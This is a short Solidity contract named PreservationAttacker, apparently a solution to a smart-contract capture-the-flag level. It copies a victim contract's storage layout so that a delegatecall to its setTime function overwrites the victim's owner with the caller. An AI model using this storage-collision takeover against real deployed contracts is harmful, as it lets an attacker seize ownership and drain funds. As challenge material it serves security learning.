// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor() {}

    function setTime(uint256) external {
        owner = msg.sender;
    }
}
